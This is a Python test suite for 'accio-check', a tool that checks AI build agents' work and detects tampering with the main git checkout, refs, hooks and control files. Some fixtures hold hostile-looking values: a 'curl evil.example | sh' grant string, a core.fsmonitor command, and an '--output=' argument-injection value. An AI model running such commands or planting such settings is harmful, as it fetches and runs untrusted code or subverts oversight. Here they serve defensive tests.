"""S-017: prefect's check script (`accio_lib.checks`, `bin/accio-check`) and the build agents' files
(DESIGN § 3.4 steps 0-3 and 7, § 4.2, § 7.1, § 12.5)."""
import json
import os
import pathlib
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from support import ROOT, commit_all, git, init_repo, write

from accio_lib import checks, merge, paths, story

CHECK = ROOT / "bin" / "accio-check"
AGENTS = ROOT / "agents"
STORY = """---
id: S-001
title: Reset link
track: story
status: doing
files: [src/a.py, src/new.py]
---
## Definition of Done
- [ ] S-001/1 WHEN a user asks THE SYSTEM SHALL send a link
- [ ] S-001/2 (no test) WHEN it ships THE SYSTEM SHALL feel fast
- [ ] S-001/3 WHEN the link is old THE SYSTEM SHALL refuse it
"""


class CheckTestBase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.repo = init_repo(pathlib.Path(self.tmp.name).resolve() / "app")
        write(self.repo / ".gitignore", ".accio/run/\n.env\nbuild/\n")
        write(self.repo / "src" / "a.py", "value = 1\n")
        self.accio = self.repo / ".accio"
        write(self.accio / "config.json", json.dumps({"checks": [
            {"command": "touch ran-python", "glob": "**/*.py"}, {"command": "touch ran-web", "glob": "web/**"}]}))
        write(self.accio / "stories" / "S-001.md", STORY)
        commit_all(self.repo)
        self.worktree = paths.worktree_root(self.repo) / "S-001"
        git(self.repo, "worktree", "add", "-q", str(self.worktree), "-b", "story/S-001")

    def tearDown(self):
        self.tmp.cleanup()

    def change(self, files):
        for path, text in files.items():
            write(self.worktree / path, text)
        commit_all(self.worktree, "story work")

    def check(self, *args):
        result = subprocess.run([sys.executable, "-I", str(CHECK), *args], cwd=self.repo, capture_output=True,
                                text=True, check=False)
        self.assertEqual(result.returncode, 0, result.stderr)
        return json.loads(result.stdout)


class ScopeAndBoundsTest(CheckTestBase):
    def test_S_017_1_only_checks_whose_glob_matches_the_diff_run(self):
        configured = [{"command": "py", "glob": "**/*.py"}, {"command": "web", "glob": "web/**"}]
        self.assertEqual(checks.scoped_to_diff(configured, ["src/a.py", "README.md"]), ("py",))
        self.assertEqual(checks.scoped_to_diff(configured, []), ())
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        reply = self.check("S-001")
        self.assertTrue((self.worktree / "ran-python").exists())
        self.assertFalse((self.worktree / "ran-web").exists())
        self.assertEqual((reply["pass"], reply["failing"]), (True, []))

    def test_S_017_1_a_failing_check_is_named(self):
        write(self.accio / "config.json", json.dumps({"checks": [{"command": "exit 3", "glob": "**/*.py"}]}))
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        reply = self.check("S-001")
        self.assertEqual((reply["pass"], reply["failing"]), (False, ["exit 3"]))

    def test_S_017_2_a_change_outside_the_storys_files_or_tests_is_out_of_bounds(self):
        changed = ["src/a.py", "src/new.py", "tests/test_a.py", "tests/helpers.py", "src/a_test.py", "web/x.spec.ts",
                   "README.md", ".github/workflows/ci.yml"]
        self.assertEqual(checks.out_of_bounds(changed, ["src/a.py", "src/new.py"]),
                         ["README.md", ".github/workflows/ci.yml"])

    def test_S_035_4_evals_mocks_and_fixtures_folders_are_the_test_area(self):
        exempt = ["evals/case-1.md", "eval/run.sh", "src/__mocks__/api.js", "src/__fixtures__/user.bin",
                  "accio/evals/README.md"]
        flagged = [".accio/evals/x.md", "src/evaluate/a.py", "src/evals.py"]
        self.assertEqual(checks.out_of_bounds(exempt + flagged, ["src/a.py"]), flagged)

    def test_S_017_2_test_files_are_known_by_common_layouts_but_never_under_dot_folders(self):
        exempt = ["Tests/FooTests.swift", "Tests/Helpers.swift", "app/tests.py", "src/FooTest.java", "pkg/a_test.go",
                  "tests/fixtures/x.json", "src/__tests__/a.tsx", "spec/models/user_spec.rb", "tests/test_hook.sh",
                  "src/components/__snapshots__/Button.test.tsx.snap", "pkg/testdata/in.json", "conftest.py",
                  "cypress/e2e/login.cy.ts", "AppTests/Info.plist"]
        flagged = [".github/workflows/test_deploy.yml", ".husky/tests/x.py", ".accio/run/tests/x.py",
                   "tests/payload.bin", "scripts/deploy.py"]
        self.assertEqual(checks.out_of_bounds(exempt + flagged, ["src/a.py"]), flagged)
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "README.md": "changed\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        reply = self.check("S-001")
        self.assertEqual((reply["pass"], reply["out_of_bounds"]), (False, ["README.md"]))


class DodTagsTest(CheckTestBase):
    def test_S_017_3_a_testable_dod_line_with_no_tagged_test_is_untagged(self):
        parsed = story.parse(self.accio / "stories" / "S-001.md")
        self.assertEqual(checks.untagged(parsed.dod, ["def test_S_001_1_sends(): pass\n"]), ["S-001/3"])
        self.assertEqual(checks.untagged(parsed.dod, ["# covers S-001/1\n", "# S-001/3\n"]), [])
        self.assertEqual(checks.untagged(parsed.dod, ["# S-001/10 S-001/30\n", "test_S_001_11\n"]),
                         ["S-001/1", "S-001/3"])

    def test_S_017_3_shell_tests_carry_tags(self):
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_hook.sh": "# S-001/1\n", "test/b.bats": "# S-001/3\n"})
        self.assertEqual(self.check("S-001")["untagged"], [])

    def test_S_017_3_tags_are_found_only_in_test_files_of_the_worktree(self):
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "# S-001/1 S-001/3\n", "tests/test_a.py": "def test_S_001_1(): pass\n",
                     "tests/fixtures/data.json": '{"note": "S-001/3"}\n'})
        reply = self.check("S-001")
        self.assertEqual((reply["pass"], reply["untagged"]), (False, ["S-001/3"]))


class SnapshotTest(CheckTestBase):
    def test_S_017_4_a_change_to_the_main_checkout_during_the_story_is_listed(self):
        write(self.repo / "notes.txt", "mine\n")
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        self.assertEqual(self.check("S-001")["main_changed"], [])
        write(self.repo / "src" / "a.py", "value = 9\n")
        write(self.repo / "notes.txt", "changed by an agent\n")
        write(self.repo / "stray.py", "x\n")
        reply = self.check("S-001")
        self.assertEqual((reply["pass"], sorted(reply["main_changed"])), (False, ["notes.txt", "src/a.py",
                                                                                  "stray.py"]))

    def test_S_017_4_the_runs_own_files_are_never_a_change(self):
        write(self.repo / ".gitignore", "")
        commit_all(self.repo, "run folder not ignored")
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        write(self.accio / "run" / "S-001" / "build-report.md", "done\n")
        self.assertEqual(self.check("S-001")["main_changed"], [])

    def test_S_017_4_ignored_files_staged_changes_and_modes_count(self):
        write(self.repo / "src" / "a.py", "value = 5\n")
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        write(self.repo / ".env", "KEY=planted\n")
        (self.repo / "src" / "a.py").chmod(0o755)
        self.assertEqual(sorted(self.check("S-001")["main_changed"]), [".env", "src/a.py"])

    def test_S_017_4_a_file_planted_in_an_ignored_folder_or_a_moved_link_counts(self):
        write(self.repo / "build" / "out.js", "x\n")
        (self.repo / "link").symlink_to(self.repo / "src")
        self.check("S-001", "snapshot")
        write(self.repo / "build" / "planted.js", "y\n")
        (self.repo / "link").unlink()
        (self.repo / "link").symlink_to(self.repo / "build")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        self.assertEqual(checks.compare(before, checks.snapshot(self.repo, "main"))[0], ["build", "link"])

    def test_S_017_1_the_checks_share_one_time_budget(self):
        write(self.accio / "config.json", json.dumps({"checks": [{"command": "sleep 1.5", "glob": "**"},
                                                                 {"command": "sleep 1.6", "glob": "**"}]}))
        parsed = story.parse(self.accio / "stories" / "S-001.md")
        settings = {"checks": [{"command": "sleep 1.5", "glob": "**"}, {"command": "sleep 1.6", "glob": "**"}],
                    "base_branch": "main"}
        self.change({"src/a.py": "value = 2\n"})
        with mock.patch.object(checks, "CHECK_TIMEOUT_SECONDS", 2):
            reply = checks.run(self.repo, self.worktree, parsed, git(self.repo, "rev-parse", "main"), settings,
                               checks.snapshot(self.repo, "main"), self.accio / "run" / "S-001")
        self.assertEqual(reply["failing"], ["sleep 1.6"])

    def test_the_ledger_key_covers_the_same_diff_as_the_check(self):
        self.change({"src/a.py": "value = 2\n"})
        ledger_cli = [sys.executable, "-I", str(ROOT / "bin" / "accio-ledger"), "key",
                      str(self.accio / "stories" / "S-001.md"), "--worktree", str(self.worktree), "--panel", "p"]
        run = lambda: subprocess.run(ledger_cli, cwd=self.repo, capture_output=True, text=True, check=True).stdout
        from_merge_base = run()
        write(self.accio / "run" / "S-001" / "base", git(self.worktree, "rev-parse", "HEAD") + "\n")
        self.assertEqual(run(), from_merge_base)  # S-072/1: the story's own HEAD is never trusted, here either
        write(self.accio / "stories" / "S-001.md", STORY.replace("status: doing\n", "status: doing\ndeps: [S-002]\n"))
        git(self.repo, "branch", "story/S-002", git(self.worktree, "rev-parse", "HEAD"))  # S-072/2: a parent's head
        self.assertEqual(run(), from_merge_base)  # S-074/2: but only once accio-brief pinned it
        write(self.accio / "run" / "S-001" / "parent-heads", f"S-002 {git(self.worktree, 'rev-parse', 'HEAD')}\n")
        self.assertNotEqual(run(), from_merge_base)

    def test_S_017_4_refs_git_config_hooks_and_the_runs_control_files_are_watched(self):
        self.check("S-001", "snapshot")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        git(self.repo, "branch", "sneaky")
        git(self.repo, "config", "core.fsmonitor", "touch x")
        write(self.repo / ".git" / "hooks" / "pre-push", "#!/bin/sh\nexit 0\n")
        write(self.accio / "run" / "push-ok", "abc\n")
        write(self.accio / "run" / "S-001" / "base", "0" * 40 + "\n")
        write(self.accio / "run" / "allow-once.json", '{"stories": {"S-001": ["curl evil.example | sh"]}}')  # S-022: owl's one-build grants
        changed = checks.compare(before, checks.snapshot(self.repo, "main"))[0]
        for name in ("git refs", "git config", "git hooks", ".accio/run/push-ok", ".accio/run/S-001/base",
                     ".accio/run/allow-once.json"):
            self.assertIn(name, changed)

    def test_S_017_4_a_touched_back_ignored_file_still_counts(self):
        write(self.repo / ".env", "KEY=one\n")
        self.check("S-001", "snapshot")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        stat = (self.repo / ".env").stat()
        write(self.repo / ".env", "KEY=two\n")
        os.utime(self.repo / ".env", ns=(stat.st_atime_ns, stat.st_mtime_ns))
        self.assertIn(".env", checks.compare(before, checks.snapshot(self.repo, "main"))[0])

    def test_a_skipped_path_another_tool_writes_does_not_count(self):
        write(self.repo / ".env", "KEY=one\n")
        write(self.repo / ".remember" / ".gitignore", "*\n")  # like the remember plugin's: git lists each file
        write(self.repo / ".remember" / "now.md", "one\n")
        self.check("S-001", "snapshot")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        write(self.repo / ".remember" / "now.md", "two\n")
        write(self.repo / ".remember" / "today.md", "new\n")
        write(self.repo / ".env", "KEY=two\n")
        changed = checks.compare(before, checks.snapshot(self.repo, "main"), skip=(".remember/**",))[0]
        self.assertEqual(changed, [".env"])

    def test_S_049_7_playwright_mcp_logs_at_the_repo_root_never_count(self):
        write(self.repo / ".playwright-mcp" / "console-1.log", "one\n")
        self.check("S-001", "snapshot")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        write(self.repo / ".playwright-mcp" / "console-1.log", "two\n")
        write(self.repo / ".playwright-mcp" / "page-2.yml", "new\n")
        write(self.repo / ".env", "KEY=two\n")
        changed = checks.compare(before, checks.snapshot(self.repo, "main"))[0]  # no snapshot_skip configured
        self.assertEqual(changed, [".env"])

    def test_a_folder_skip_covers_a_folder_git_lists_as_one_entry(self):
        write(self.repo / "build" / "out.txt", "one\n")  # the repo's .gitignore holds `build/`: one `build` entry
        self.check("S-001", "snapshot")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        write(self.repo / "build" / "more.txt", "two\n")
        self.assertEqual(checks.compare(before, checks.snapshot(self.repo, "main"), skip=("build/**",))[0], [])

    def snap_before(self):
        self.check("S-001", "snapshot")
        return json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))

    def changed_for_s001(self, before):
        return checks.compare(before, checks.snapshot(self.repo, "main"), story_id="S-001")[0]

    def test_S_016_2_another_storys_base_in_the_log_is_forgiven(self):
        before = self.snap_before()
        write(self.accio / "run" / "S-002" / "base", "1" * 40 + "\n")
        write(self.accio / "run" / "base-writes.log", "S-002 " + "1" * 40 + "\n")
        write(self.accio / "run" / "S-001" / "base", "0" * 40 + "\n")
        self.assertEqual(self.changed_for_s001(before), [".accio/run/S-001/base"])

    def test_S_016_3_another_storys_base_not_in_the_log_counts(self):
        before = self.snap_before()
        write(self.accio / "run" / "S-002" / "base", "1" * 40 + "\n")
        write(self.accio / "run" / "base-writes.log", "S-002 " + "2" * 40 + "\n")
        self.assertEqual(self.changed_for_s001(before), [".accio/run/S-002/base"])

    def test_S_074_1_another_storys_pins_in_the_log_are_forgiven(self):
        before = self.snap_before()
        write(self.accio / "run" / "S-002" / "parent-heads", "S-003 " + "1" * 40 + "\n")
        write(self.accio / "run" / "base-writes.log", "S-002 S-003 " + "1" * 40 + "\n")
        write(self.accio / "run" / "S-004" / "parent-heads", "")  # a story with no parents
        self.assertEqual(self.changed_for_s001(before), [])

    def test_S_074_1_pins_not_in_the_log_or_the_storys_own_count(self):
        before = self.snap_before()
        write(self.accio / "run" / "S-002" / "parent-heads", "S-003 " + "1" * 40 + "\n")
        write(self.accio / "run" / "base-writes.log", "S-002 S-003 " + "2" * 40 + "\n")
        write(self.accio / "run" / "S-001" / "parent-heads", "S-003 " + "2" * 40 + "\n")
        self.assertEqual(self.changed_for_s001(before),
                         [".accio/run/S-001/parent-heads", ".accio/run/S-002/parent-heads"])

    def test_S_016_4_lines_appended_to_the_log_do_not_count(self):
        write(self.accio / "run" / "base-writes.log", "S-009 " + "9" * 40 + "\n")
        before = self.snap_before()
        write(self.accio / "run" / "base-writes.log", "S-009 " + "9" * 40 + "\nS-002 " + "1" * 40 + "\n")
        self.assertEqual(self.changed_for_s001(before), [])

    def test_S_016_5_a_rewritten_or_deleted_log_counts(self):
        log = self.accio / "run" / "base-writes.log"
        write(log, "S-009 " + "9" * 40 + "\n")
        before = self.snap_before()
        write(log, "S-009 " + "8" * 40 + "\n")
        self.assertEqual(self.changed_for_s001(before), [".accio/run/base-writes.log"])
        log.unlink()
        self.assertEqual(self.changed_for_s001(before), [".accio/run/base-writes.log"])

    def test_finders_ds_store_files_never_count(self):
        write(self.repo / ".DS_Store", "one")
        write(self.accio / ".DS_Store", "one")
        self.check("S-001", "snapshot")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        write(self.repo / ".DS_Store", "two")
        write(self.accio / ".DS_Store", "two")
        write(self.repo / "src" / ".DS_Store", "new")
        self.assertEqual(checks.compare(before, checks.snapshot(self.repo, "main"))[0], [])

    def test_a_skip_never_hides_accios_own_files(self):
        self.check("S-001", "snapshot")
        before = json.loads((self.accio / "run" / "S-001" / "main-snapshot.json").read_text(encoding="utf-8"))
        write(self.accio / "run" / "push-ok", "abc\n")
        write(self.accio / "config.json", '{"snapshot_skip": ["**"]}')
        changed = checks.compare(before, checks.snapshot(self.repo, "main"), skip=("**", ".accio/**"))[0]
        self.assertIn(".accio/run/push-ok", changed)
        self.assertIn(".accio/config.json", changed)

    def test_a_recorded_base_that_isnt_an_ancestor_is_not_trusted(self):
        run_dir = self.accio / "run" / "S-001"
        merge_base = git(self.repo, "rev-parse", "main")
        for bad in ("HEAD~1", "--output=/tmp/x", "f" * 40):
            write(run_dir / "base", bad + "\n")
            self.assertEqual(checks.diff_start(run_dir, self.worktree, "main"), merge_base, bad)

    def test_S_017_4_a_change_that_is_only_staged_counts(self):
        write(self.repo / "src" / "a.py", "value = 5\n")
        self.check("S-001", "snapshot")
        git(self.repo, "add", "src/a.py")
        self.assertEqual(checks.compare(json.loads((self.accio / "run" / "S-001" / "main-snapshot.json")
                                                   .read_text(encoding="utf-8")),
                                        checks.snapshot(self.repo, "main"))[0], ["src/a.py"])

    def test_checks_are_stopped_before_prefects_tool_call_is(self):
        captured = {}

        def fake_run_checks(worktree, commands, timeout):
            captured["timeout"] = timeout
            return {}
        parsed = story.parse(self.accio / "stories" / "S-001.md")
        settings = {"checks": [{"command": "true", "glob": "**"}], "base_branch": "main"}
        self.change({"src/a.py": "value = 2\n"})
        with mock.patch.object(merge, "run_checks", fake_run_checks):
            checks.run(self.repo, self.worktree, parsed, git(self.repo, "rev-parse", "main"), settings,
                       checks.snapshot(self.repo, "main"), self.accio / "run" / "S-001")
        self.assertLess(captured["timeout"], 10 * 60)

    def test_S_017_4_a_snapshot_is_written_once_per_brief(self):
        self.check("S-001", "snapshot")
        result = subprocess.run([sys.executable, "-I", str(CHECK), "S-001", "snapshot"], cwd=self.repo,
                                capture_output=True, text=True, check=False)
        self.assertEqual(result.returncode, 1)
        self.assertIn("already", result.stderr)
        self.check("S-001", "snapshot", "--fresh")

    def test_S_017_4_a_commit_on_main_during_the_story_is_listed(self):
        self.check("S-001", "snapshot")
        write(self.repo / "b.py", "x\n")
        commit_all(self.repo, "sneaky")
        self.assertIn("HEAD", self.check("S-001")["main_changed"])

    def test_S_017_6_a_moved_origin_base_blocks_the_story(self):
        first = git(self.repo, "rev-parse", "HEAD")
        git(self.repo, "update-ref", "refs/remotes/origin/main", first)
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        self.assertFalse(self.check("S-001")["remote_moved"])
        git(self.repo, "update-ref", "refs/remotes/origin/main", git(self.worktree, "rev-parse", "HEAD"))
        reply = self.check("S-001")
        self.assertEqual((reply["pass"], reply["remote_moved"]), (False, True))

    def test_a_check_that_runs_too_long_is_stopped_and_named(self):
        failing = merge.run_checks(self.worktree, ["sleep 5"], timeout=1)
        self.assertIn("stopped after", failing["sleep 5"])

    def test_a_check_without_a_snapshot_says_so(self):
        result = subprocess.run([sys.executable, "-I", str(CHECK), "S-001"], cwd=self.repo, capture_output=True,
                                text=True, check=False)
        self.assertEqual(result.returncode, 1)
        self.assertIn("snapshot", result.stderr)


class DiffStartTest(CheckTestBase):
    """S-072: the recorded base is used only when the story's own branch didn't make it."""

    def setUp(self):
        super().setUp()
        self.run_dir = self.accio / "run" / "S-001"
        self.prepared = git(self.repo, "rev-parse", "main")

    def record(self, commit):
        write(self.run_dir / "base", commit + "\n")

    def start(self):
        return checks.diff_start(self.run_dir, self.worktree, "main")

    def test_the_diff_starts_where_accio_brief_recorded_it(self):
        self.assertEqual(self.start(), self.prepared)
        self.record(self.prepared)
        self.change({"src/a.py": "value = 2\n"})
        self.assertEqual(self.start(), self.prepared)

    def test_S_072_1_the_storys_head_or_own_commit_is_not_the_diff_start(self):
        self.change({"src/a.py": "value = 2\n"})
        self.change({"src/new.py": "x = 1\n"})
        for own in ("HEAD", "HEAD~1"):
            self.record(git(self.worktree, "rev-parse", own))
            self.assertEqual(self.start(), self.prepared, own)
            self.assertIsNone(checks.trusted_base(self.run_dir, self.worktree, "main"), own)
        changed = checks.changed_files(self.worktree, self.start())
        self.assertEqual(sorted(changed), ["src/a.py", "src/new.py"])

    def test_S_072_1_another_story_branch_that_isnt_a_dep_does_not_make_it_trusted(self):
        self.change({"src/a.py": "value = 2\n"})
        own = git(self.worktree, "rev-parse", "HEAD")
        git(self.repo, "branch", "story/S-009", own)  # planted by the story's code; S-001 has no deps
        self.record(own)
        self.assertEqual(self.start(), self.prepared)

    def stacked(self):
        """S-001 stacked on S-002: the parent's head is on story/S-002, recorded and pinned as accio-brief does."""
        write(self.accio / "stories" / "S-001.md", STORY.replace("status: doing\n", "status: doing\ndeps: [S-002]\n"))
        self.change({"src/a.py": "value = 2\n"})  # the parent's work, on the parent's branch
        parent_head = git(self.worktree, "rev-parse", "HEAD")
        git(self.repo, "branch", "story/S-002", parent_head)
        self.change({"src/new.py": "x = 1\n"})
        self.record(parent_head)
        write(self.run_dir / "parent-heads", f"S-002 {parent_head}\n")
        return parent_head

    def test_S_072_2_a_stacked_storys_parent_head_is_still_the_diff_start(self):
        parent_head = self.stacked()
        self.assertEqual(self.start(), parent_head)
        self.assertEqual(checks.changed_files(self.worktree, self.start()), ["src/new.py"])

    def test_S_074_2_a_base_on_a_moved_parent_branch_is_not_trusted_unless_pinned(self):
        self.stacked()
        own = git(self.worktree, "rev-parse", "HEAD")
        git(self.repo, "branch", "-f", "story/S-002", own)  # the story's code moves its parent's branch
        self.record(own)
        self.assertIsNone(checks.trusted_base(self.run_dir, self.worktree, "main"))
        self.assertEqual(self.start(), self.prepared)
        self.assertEqual(sorted(checks.changed_files(self.worktree, self.start())), ["src/a.py", "src/new.py"])

    def test_S_074_2_a_parent_head_that_was_never_pinned_is_not_trusted(self):
        parent_head = self.stacked()
        (self.run_dir / "parent-heads").unlink()
        self.assertIsNone(checks.trusted_base(self.run_dir, self.worktree, "main"))
        write(self.run_dir / "parent-heads", "S-002 not-a-commit\n")
        self.assertEqual(self.start(), self.prepared, parent_head)

    def test_S_074_3_a_parent_branch_moved_after_the_pin_still_diffs_from_the_pinned_head(self):
        parent_head = self.stacked()
        for moved_to in (self.prepared, git(self.worktree, "rev-parse", "HEAD")):
            git(self.repo, "branch", "-f", "story/S-002", moved_to)
            self.assertEqual(self.start(), parent_head, moved_to)
        git(self.repo, "branch", "-D", "story/S-002")
        self.assertEqual(self.start(), parent_head)
        self.assertEqual(checks.changed_files(self.worktree, self.start()), ["src/new.py"])

    def test_S_072_3_the_base_branch_commit_from_prepare_time_is_still_used_after_main_moves(self):
        self.record(self.prepared)
        write(self.repo / "later.txt", "main moved on\n")
        commit_all(self.repo, "main moves on")
        self.change({"src/a.py": "value = 2\n"})
        self.assertEqual(checks.trusted_base(self.run_dir, self.worktree, "main"), self.prepared)
        self.assertEqual(self.start(), self.prepared)


class MutationAuditTest(CheckTestBase):
    """S-017/8, decision 011 (option A): the project's own mutation tool, called on the story's diff."""

    def tool(self, body):
        script = self.repo.parent / "fake-mutation-tool.py"
        write(script, body)
        config = json.loads((self.accio / "config.json").read_text(encoding="utf-8"))
        config["mutation"] = {"command": f"{sys.executable} {script} {{diff}}"}
        write(self.accio / "config.json", json.dumps(config))

    def run_story(self):
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        return self.check("S-001")

    def test_S_017_8_a_surviving_mutant_on_the_changed_lines_is_a_weak_test(self):
        self.tool("import sys\ndiff = open(sys.argv[1]).read()\n"
                  "print('mutating...')\n"
                  "if '+value = 2' in diff: print('src/a.py:1: replaced 2 with 3, no test failed')\n")
        reply = self.run_story()
        self.assertEqual((reply["audit"], reply["weak_tests"]), ("audited", ["src/a.py:1: replaced 2 with 3, no test failed"]))
        self.assertFalse(reply["pass"])

    def test_S_017_8_no_survivors_passes_and_no_tool_means_not_audited(self):
        self.tool("print('all mutants caught')\n")
        reply = self.run_story()
        self.assertEqual((reply["audit"], reply["weak_tests"], reply["pass"]), ("audited", [], True))
        write(self.accio / "config.json", json.dumps({"checks": []}))
        self.assertEqual(self.check("S-001")["audit"], "not audited")

    def test_S_017_8_a_tool_that_fails_is_reported_but_does_not_fail_the_story(self):
        self.tool("import sys\nprint('src/a.py:1: half a run')\nsys.exit(2)\n")
        reply = self.run_story()
        self.assertEqual((reply["audit"], reply["weak_tests"], reply["pass"]), ("failed", [], True))
        self.assertIn("half a run", reply["audit_output"])

    def test_the_mutation_command_must_name_the_diff(self):
        write(self.accio / "config.json", json.dumps({"mutation": {"command": "cargo mutants"}}))
        result = subprocess.run([sys.executable, "-I", str(CHECK), "S-001", "snapshot"], cwd=self.repo,
                                capture_output=True, text=True, check=False)
        self.assertEqual(result.returncode, 1)
        self.assertIn("{diff}", result.stderr)


class CheckFindingsTest(CheckTestBase):
    """S-034: failed checks are written as findings in run/<ID>/check-findings.md, for a fix round."""

    def findings(self):
        return (self.accio / "run" / "S-001" / "check-findings.md").read_text(encoding="utf-8")

    def configure(self, command, extra=None):
        write(self.accio / "config.json", json.dumps({"checks": [{"command": command, "glob": "**/*.py"}], **(extra or {})}))
        self.check("S-001", "snapshot")

    def test_S_034_1_one_finding_per_failing_command_with_the_last_2000_characters(self):
        write(self.accio / "config.json", json.dumps({"checks": [
            {"command": "echo first; exit 3", "glob": "**/*.py"},
            {"command": "python3 -c \"print('x' * 3000 + 'END'); raise SystemExit(1)\"", "glob": "**/*.py"}]}))
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        reply = self.check("S-001")
        text = self.findings()
        self.assertEqual(reply["findings"], str(self.accio / "run" / "S-001" / "check-findings.md"))
        self.assertIn("## check-1", text)
        self.assertIn("## check-2", text)
        self.assertNotIn("## check-3", text)
        self.assertIn("echo first; exit 3", text)
        self.assertIn("first", text)
        self.assertIn("xEND", text)
        self.assertNotIn("x" * 2001, text)

    def test_S_034_1_a_passing_check_writes_no_file(self):
        self.configure("true")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        reply = self.check("S-001")
        self.assertNotIn("findings", reply)
        self.assertFalse((self.accio / "run" / "S-001" / "check-findings.md").exists())

    def test_S_034_2_an_untagged_dod_line_is_a_finding(self):
        self.configure("true")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1\n"})
        self.check("S-001")
        self.assertRegex(self.findings(), r"## check-1 \[open\] untagged DoD line: S-001/3")

    def test_S_034_3_a_weak_test_is_a_finding(self):
        script = self.repo.parent / "fake-mutation-tool.py"
        write(script, "print('src/a.py:1: replaced 2 with 3, no test failed')\n")
        self.configure("true", {"mutation": {"command": f"{sys.executable} {script} {{diff}}"}})
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        self.check("S-001")
        self.assertRegex(self.findings(), r"## check-1 \[open\] weak test: src/a.py:1: replaced 2 with 3")

    def test_S_034_4_an_out_of_bounds_file_is_a_finding(self):
        self.configure("true")
        self.change({"src/a.py": "value = 2\n", "src/other.py": "x = 1\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        self.check("S-001")
        self.assertRegex(self.findings(), r"## check-1 \[open\] file outside the story: src/other.py")

    def test_S_034_6_the_re_check_marks_each_earlier_id_resolved_or_open(self):
        write(self.accio / "config.json", json.dumps({"checks": [
            {"command": "test -f tests/fixed.txt", "glob": "**/*.py"}, {"command": "exit 4", "glob": "**/*.py"}]}))
        self.check("S-001", "snapshot")
        self.change({"src/a.py": "value = 2\n", "tests/test_a.py": "# S-001/1 S-001/3\n"})
        self.check("S-001")
        self.assertRegex(self.findings(), r"## check-2 \[open\] failing command: test -f tests/fixed.txt")
        self.change({"tests/fixed.txt": ""})
        reply = self.check("S-001")
        text = self.findings()
        self.assertRegex(text, r"## check-2 \[resolved\] failing command: test -f tests/fixed.txt")
        self.assertRegex(text, r"## check-1 \[open\] failing command: exit 4")
        self.assertEqual(reply["check_status"], {"check-1": "open", "check-2": "resolved"})
        self.assertFalse(reply["pass"])


class AgentFilesTest(unittest.TestCase):
    def front(self, name):
        text = (AGENTS / f"{name}.md").read_text(encoding="utf-8")
        front, body = text.removeprefix("---\n").split("\n---\n", 1)
        return dict(line.split(":", 1) for line in front.strip().splitlines()), body

    def test_S_017_5_each_build_agent_sets_its_model_tools_and_reply(self):
        expected = {"portkey": ("haiku", {"Bash"}, "worktree"),
                    "house-elf": ("sonnet", {"Read", "Grep", "Glob", "Write", "Edit", "Bash"}, "DONE_WITH_CONCERNS"),
                    "prefect": ("haiku", {"Bash", "Write"}, "out_of_bounds")}
        for name, (model, tools, reply_word) in expected.items():
            with self.subTest(name):
                fields, body = self.front(name)
                self.assertEqual(fields["name"].strip(), name)
                self.assertEqual(fields["model"].strip(), model)
                self.assertEqual({tool.strip() for tool in fields["tools"].split(",")}, tools)
                self.assertIn(reply_word, body)

    def test_S_017_7_house_elf_claims_first_and_starts_each_command_in_its_worktree(self):
        _, body = self.front("house-elf")
        first_rule = body.split("**Every Bash command**")[0]
        self.assertIn("accio-claim", first_rule)
        self.assertIn("cd <worktree> &&", body)


if __name__ == "__main__":
    unittest.main()
